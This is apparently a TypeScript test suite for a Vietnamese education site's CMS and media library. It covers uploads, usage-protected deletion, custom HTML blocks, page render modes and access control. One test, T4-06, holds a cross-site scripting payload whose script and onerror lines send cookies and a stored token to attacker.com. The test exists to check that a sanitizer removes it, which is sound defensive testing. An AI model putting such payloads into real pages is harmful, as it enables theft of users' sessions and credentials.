import { describe, it, before, after, beforeEach } from 'node:test';
import assert from 'node:assert';
import {
  createTestServer,
  __setSimulatedR2Objects,
  __clearSimulatedR2Objects,
  __setMockUsages,
  __clearMockUsages,
} from './helpers/testServer.ts';
import type { TestServerContext } from './helpers/testServer.ts';
import { sanitizeHtml, simulateShadowDomRender, getContainerClasses } from './helpers/htmlSanitizer.ts';
import {
  createDefaultUniversalBlock,
  validateUniversalBlock,
  validateUtilityPageConfig,
  simulateSingleSegmentRedirect,
} from './helpers/cmsSchema.ts';
import type { BaseUtilityPageConfig } from './helpers/cmsSchema.ts';

describe('Tier 3: Cross-Feature Integration Pipelines (Workflows T3-01 to T3-08)', () => {
  let ctx: TestServerContext;

  before(async () => {
    ctx = await createTestServer();
  });

  after(async () => {
    await ctx.close();
  });

  beforeEach(() => {
    __clearSimulatedR2Objects();
    __clearMockUsages();
  });

  it('Workflow T3-01: Upload -> Filename Generation -> Usage Check -> Safe Physical Deletion', async () => {
    // 1. Upload file
    const formData = new FormData();
    formData.append('subfolder', 'events');
    formData.append(
      'files',
      new Blob([Buffer.from('event-data')], { type: 'image/png' }),
      'event_banner.png'
    );
    const uploadRes = await ctx.fetch('/api/admin/media/upload', {
      method: 'POST',
      body: formData,
    });
    assert.strictEqual(uploadRes.status, 200);
    const uploadBody = (await uploadRes.json()) as any;
    const uploadedItem = uploadBody.uploaded[0];
    assert.match(uploadedItem.name, /^\d{12}\.png$/);
    assert.strictEqual(uploadedItem.folder, 'media-library/events');

    // 2. Check usage
    const checkRes = await ctx.fetch('/api/admin/media/check-usage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keys: [uploadedItem.key] }),
    });
    const checkBody = (await checkRes.json()) as any;
    assert.strictEqual(checkBody.inUse, false);

    // 3. Delete file
    const deleteRes = await ctx.fetch('/api/admin/media/delete', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keys: [uploadedItem.key] }),
    });
    const deleteBody = (await deleteRes.json()) as any;
    assert.deepStrictEqual(deleteBody.deletedKeys, [uploadedItem.key]);

    // 4. Verify item is gone
    const listRes = await ctx.fetch('/api/admin/media?folder=media-library/events');
    const listBody = (await listRes.json()) as any;
    assert.strictEqual(listBody.items.length, 0);
  });

  it('Workflow T3-02: Upload -> Check-Usage In-Use Protection -> Prevent Accidental Deletion', async () => {
    // 1. Upload promo hero
    const formData = new FormData();
    formData.append(
      'files',
      new Blob([Buffer.from('promo')], { type: 'image/webp' }),
      'promo_hero.webp'
    );
    const uploadRes = await ctx.fetch('/api/admin/media/upload', {
      method: 'POST',
      body: formData,
    });
    const uploadBody = (await uploadRes.json()) as any;
    const item = uploadBody.uploaded[0];

    // 2. Register mock usage in homepage custom_html block
    __setMockUsages([
      {
        key: item.key,
        location: 'site_configs.homepage_blocks',
        details: 'Khối custom_html: Hero Promo 2026',
      },
    ]);

    // 3. Check usage before deletion
    const checkRes = await ctx.fetch('/api/admin/media/check-usage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keys: [item.key] }),
    });
    const checkBody = (await checkRes.json()) as any;
    assert.strictEqual(checkBody.inUse, true);
    assert(checkBody.usages[0].details.includes('Hero Promo 2026'));

    // 4. Because inUse is true, admin client aborts deletion and does not call delete
    // Verify item remains alive in library
    const listRes = await ctx.fetch('/api/admin/media');
    const listBody = (await listRes.json()) as any;
    assert(listBody.items.some((it: any) => it.key === item.key));
  });

  it('Workflow T3-03: CMS Builder -> Quick-Add custom_html -> Media Picker Insert Image -> Live Preview -> UniversalBlockRenderer', () => {
    // 1. Quick add block
    const block = createDefaultUniversalBlock('custom_html', 0);
    block.config.admin_label = 'Banner Đầu Trang';
    block.config.container_mode = 'boxed';

    // 2. Media picker insertion simulation
    const r2Domain = (process.env.R2_DOMAIN || '').replace(/\/$/, '');
    const mediaUrl = `${r2Domain}/media-library/261112101010.png`;
    const insertedHtml = `<img src="${mediaUrl}" alt="Banner" class="w-full h-auto" />`;
    block.config.html_content = insertedHtml;

    // 3. Validate block schema
    const validation = validateUniversalBlock(block);
    assert.strictEqual(validation.valid, true);

    // 4. Live preview rendering
    const preview = simulateShadowDomRender({
      htmlContent: block.config.html_content,
      containerMode: block.config.container_mode,
    });
    assert.strictEqual(preview.shadowMode, 'open');
    assert(preview.sanitizedHtml.includes(mediaUrl));
    assert(preview.containerClasses.includes('max-w-6xl'));
  });

  it('Workflow T3-04: Utility Page Migration: Legacy -> Hybrid -> Blocks', () => {
    // 1. Legacy mode
    const faqLegacy: BaseUtilityPageConfig = {
      title: 'FAQ',
      faqs: [{ question: 'Q1', answer: 'A1' }],
      render_mode: 'legacy',
    };
    assert.strictEqual(validateUtilityPageConfig(faqLegacy).effectiveMode, 'legacy');

    // 2. Hybrid mode
    const customBlock = createDefaultUniversalBlock('custom_html', 0);
    customBlock.config.html_content = '<div class="alert">Thông báo khẩn</div>';

    const faqHybrid: BaseUtilityPageConfig = {
      ...faqLegacy,
      render_mode: 'hybrid',
      blocks: [customBlock],
    };
    const hybridVal = validateUtilityPageConfig(faqHybrid);
    assert.strictEqual(hybridVal.valid, true);
    assert.strictEqual(hybridVal.effectiveMode, 'hybrid');

    // 3. Blocks mode (accordion replaced)
    const faqBlocks: BaseUtilityPageConfig = {
      title: 'FAQ',
      render_mode: 'blocks',
      blocks: [customBlock],
    };
    const blocksVal = validateUtilityPageConfig(faqBlocks);
    assert.strictEqual(blocksVal.valid, true);
    assert.strictEqual(blocksVal.effectiveMode, 'blocks');
  });

  it('Workflow T3-05: DynamicHomepageBlocks Legacy mode === "custom_html" Wrapped in IsolatedHtmlBlock', () => {
    const legacyHtml = '<style>h1 { color: purple; }</style><h1>Khóa Học</h1>';
    const rendered = simulateShadowDomRender({ htmlContent: legacyHtml });

    assert.strictEqual(rendered.shadowMode, 'open');
    assert(rendered.scopedStylesIncluded);
    assert(rendered.sanitizedHtml.includes('Khóa Học'));
  });

  it('Workflow T3-06: Media Manager Dynamic Folder Tree & Filtering across Old Flat Folders and New Nested Folders', async () => {
    __setSimulatedR2Objects([
      { key: 'samplespages/old1.png' },
      { key: 'homepagehero/hero.jpg' },
      { key: 'samples/pages/new1.png' },
      { key: 'homepage/hero/new_hero.jpg' },
      { key: 'media-library/2026/banner.webp' },
    ]);

    const res = await ctx.fetch('/api/admin/media');
    const body = (await res.json()) as any;
    assert.strictEqual(body.folders.length, 5);

    // Filter by new nested folder
    const nestedRes = await ctx.fetch('/api/admin/media?folder=samples/pages');
    const nestedBody = (await nestedRes.json()) as any;
    assert.strictEqual(nestedBody.items.length, 1);
    assert.strictEqual(nestedBody.items[0].key, 'samples/pages/new1.png');

    // Filter by legacy flat folder
    const flatRes = await ctx.fetch('/api/admin/media?folder=samplespages');
    const flatBody = (await flatRes.json()) as any;
    assert.strictEqual(flatBody.items.length, 1);
    assert.strictEqual(flatBody.items[0].key, 'samplespages/old1.png');
  });

  it('Workflow T3-07: Custom Pages Tab with custom_html Block and SingleSegmentRedirectHandler', () => {
    const customBlock = createDefaultUniversalBlock('custom_html', 0);
    customBlock.config.html_content = '<form><input placeholder="Nhập họ tên"/></form>';

    const customPages = [
      {
        id: 'p1',
        title: 'Chương Trình Gia Sư 1 Kèm 1',
        slug: 'gia-su-1-kem-1',
        is_active: true,
        blocks: [customBlock],
      },
    ];

    const redirect = simulateSingleSegmentRedirect('/gia-su-1-kem-1', customPages);
    assert.strictEqual(redirect.status, 200);
    assert.strictEqual(redirect.matchedPage?.slug, 'gia-su-1-kem-1');
    assert.strictEqual(redirect.matchedPage?.blocks[0].type, 'custom_html');
  });

  it('Workflow T3-08: Batch Upload Collision Handling -> Usage Check -> Batch Physical Deletion', async () => {
    const formData = new FormData();
    formData.append('subfolder', 'batch-test');
    for (let i = 0; i < 5; i++) {
      formData.append(
        'files',
        new Blob([Buffer.from(`data_${i}`)], { type: 'image/png' }),
        `file_${i}.png`
      );
    }

    const uploadRes = await ctx.fetch('/api/admin/media/upload', {
      method: 'POST',
      body: formData,
    });
    const uploadBody = (await uploadRes.json()) as any;
    assert.strictEqual(uploadBody.uploaded.length, 5);
    const keys = uploadBody.uploaded.map((u: any) => u.key);

    // Verify all keys unique
    const uniqueKeys = new Set(keys);
    assert.strictEqual(uniqueKeys.size, 5);

    // Check usage on all 5 keys
    const checkRes = await ctx.fetch('/api/admin/media/check-usage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keys }),
    });
    const checkBody = (await checkRes.json()) as any;
    assert.strictEqual(checkBody.inUse, false);

    // Batch delete all 5
    const deleteRes = await ctx.fetch('/api/admin/media/delete', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keys }),
    });
    const deleteBody = (await deleteRes.json()) as any;
    assert.strictEqual(deleteBody.deletedKeys.length, 5);
  });
});

describe('Tier 4: Real-World Application Scenarios (Scenarios T4-01 to T4-07)', () => {
  let ctx: TestServerContext;

  before(async () => {
    ctx = await createTestServer();
  });

  after(async () => {
    await ctx.close();
  });

  beforeEach(() => {
    __clearSimulatedR2Objects();
    __clearMockUsages();
  });

  it('Scenario T4-01: Admin Media Batch Upload & Dynamic Organization Workflow', async () => {
    const formData = new FormData();
    formData.append('subfolder', 'camp-2026/summer');
    for (let i = 1; i <= 3; i++) {
      formData.append(
        'files',
        new Blob([Buffer.from(`banner-${i}`)], { type: 'image/png' }),
        `banner_${i}.png`
      );
    }

    const uploadRes = await ctx.fetch('/api/admin/media/upload', {
      method: 'POST',
      body: formData,
    });
    const uploadBody = (await uploadRes.json()) as any;
    assert.strictEqual(uploadBody.uploaded.length, 3);
    uploadBody.uploaded.forEach((item: any) => {
      assert.strictEqual(item.folder, 'media-library/camp-2026/summer');
      assert.match(item.name, /^\d{12}\.png$/);
    });

    // Inspect folder tree
    const listRes = await ctx.fetch('/api/admin/media?folder=media-library/camp-2026/summer');
    const listBody = (await listRes.json()) as any;
    assert.strictEqual(listBody.items.length, 3);
  });

  it('Scenario T4-02: Marketing Campaign Landing Page Creation with Custom HTML & R2 Media Assets', () => {
    const r2Domain = (process.env.R2_DOMAIN || '').replace(/\/$/, '');
    const bannerBlock = createDefaultUniversalBlock('custom_html', 0);
    bannerBlock.config.admin_label = 'Black Friday Mega Banner';
    bannerBlock.config.container_mode = 'full_width';
    bannerBlock.config.no_padding = true;
    bannerBlock.config.html_content = `
      <div class="bf-banner">
        <img src="${r2Domain}/media-library/261112000000.webp" alt="BF" />
        <div class="countdown">Chỉ còn 3 ngày!</div>
      </div>
      <style>
        .bf-banner { background: #000; text-align: center; }
        .countdown { color: yellow; font-weight: bold; }
      </style>
    `;

    assert.strictEqual(validateUniversalBlock(bannerBlock).valid, true);

    const rendered = simulateShadowDomRender({
      htmlContent: bannerBlock.config.html_content,
      containerMode: bannerBlock.config.container_mode,
      noPadding: bannerBlock.config.no_padding,
    });
    assert.strictEqual(rendered.shadowMode, 'open');
    assert(rendered.containerClasses.includes('w-full'));
    assert(rendered.containerClasses.includes('p-0') || rendered.containerClasses.includes('px-0'));
    assert(rendered.sanitizedHtml.includes('Chỉ còn 3 ngày!'));
  });

  it('Scenario T4-03: Safe Deletion with Cascade Dependency Protection', async () => {
    __setSimulatedR2Objects([
      { key: 'media-library/old_banner.png' },
      { key: 'media-library/product_math12_thumb.png' },
      { key: 'media-library/unused_icon.png' },
    ]);

    __setMockUsages([
      {
        key: 'media-library/old_banner.png',
        location: 'site_configs.refund_policy_config',
        details: 'Khối custom_html: Chính sách hoàn tiền',
      },
      {
        key: 'media-library/product_math12_thumb.png',
        location: 'products',
        details: 'Sản phẩm: Tuyển tập Đề thi Toán 12',
      },
    ]);

    const checkRes = await ctx.fetch('/api/admin/media/check-usage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        keys: [
          'media-library/old_banner.png',
          'media-library/product_math12_thumb.png',
          'media-library/unused_icon.png',
        ],
      }),
    });
    const checkBody = (await checkRes.json()) as any;
    assert.strictEqual(checkBody.inUse, true);
    assert.strictEqual(checkBody.usages.length, 2);

    // Admin proceeds to delete ONLY unused_icon.png
    const deleteRes = await ctx.fetch('/api/admin/media/delete', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keys: ['media-library/unused_icon.png'] }),
    });
    const deleteBody = (await deleteRes.json()) as any;
    assert.deepStrictEqual(deleteBody.deletedKeys, ['media-library/unused_icon.png']);
  });

  it('Scenario T4-04: Full Multi-Mode Utility Page Lifecycle & Customer Browsing', () => {
    // 1. Donate page in hybrid mode
    const donateHybrid: BaseUtilityPageConfig = {
      title: 'Ủng hộ dự án',
      bank_name: 'MB Bank',
      account_number: '0987654321',
      account_holder: 'HUY TUTOR',
      render_mode: 'hybrid',
      blocks: [
        {
          id: 'leaderboard',
          type: 'custom_html',
          is_active: true,
          config: {
            html_content: '<div class="leaderboard"><h3>Bảng Vinh Danh Nhà Hảo Tâm</h3></div>',
            container_mode: 'boxed',
          },
        },
      ],
    };
    const val = validateUtilityPageConfig(donateHybrid);
    assert.strictEqual(val.valid, true);
    assert.strictEqual(val.effectiveMode, 'hybrid');

    // 2. FAQ in blocks mode
    const faqBlocks: BaseUtilityPageConfig = {
      title: 'Trung Tâm Trợ Giúp',
      render_mode: 'blocks',
      blocks: [
        {
          id: 'diagram',
          type: 'custom_html',
          is_active: true,
          config: {
            html_content: '<div class="diagram">Sơ đồ hướng dẫn thanh toán</div>',
          },
        },
      ],
    };
    assert.strictEqual(validateUtilityPageConfig(faqBlocks).effectiveMode, 'blocks');
  });

  it('Scenario T4-05: RBAC Boundary Attack & Error Sanitization Enforcement', async () => {
    // Guest gets 401
    const guestRes = await fetch(`${ctx.baseUrl}/api/admin/media`);
    assert.strictEqual(guestRes.status, 401);

    // Normal User gets 403
    const userRes = await ctx.fetch('/api/admin/media', {
      headers: { Authorization: 'Bearer user-token' },
    });
    assert.strictEqual(userRes.status, 403);

    // Subadmin gets 403
    const subadminRes = await ctx.fetch('/api/admin/media', {
      headers: { Authorization: 'Bearer subadmin-token' },
    });
    assert.strictEqual(subadminRes.status, 403);

    // Public error sanitized
    const publicErr = await ctx.fetch('/api/public-test-error');
    const pubBody = (await publicErr.json()) as any;
    assert.strictEqual(pubBody.error.includes('PGRST'), false);
    assert(pubBody.error.includes('Đã có lỗi xảy ra'));
  });

  it('Scenario T4-06: Malicious Content Injection & CSS Containment Defense', () => {
    const maliciousPayload = `
      <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
      <img src="nonexistent.jpg" onerror="fetch('http://attacker.com/steal?token=' + localStorage.getItem('token'))" />
      <style>html, body { display: none !important; } * { font-family: 'Comic Sans MS' !important; }</style>
      <a href="javascript:alert(document.domain)">Claim Prize</a>
    `;

    const sanitized = sanitizeHtml(maliciousPayload);
    assert.strictEqual(/<script/i.test(sanitized), false);
    assert.strictEqual(/onerror/i.test(sanitized), false);
    assert.strictEqual(/javascript:/i.test(sanitized), false);
    // Preserves style safely for shadow encapsulation
    assert(sanitized.includes('<style>'));
  });

  it('Scenario T4-07: Full Universal CMS Catalog Quick-Add Consistency Across All 5 Builders', () => {
    const builders = ['homepage', 'category', 'combo', 'flashcard', 'product_detail'];

    builders.forEach((builderName) => {
      const block = createDefaultUniversalBlock('custom_html', 0);
      block.config.admin_label = `${builderName} Custom Banner`;
      block.config.html_content = `<div>${builderName} Content</div>`;
      const val = validateUniversalBlock(block);
      assert.strictEqual(val.valid, true, `Failed on builder: ${builderName}`);
    });
  });
});
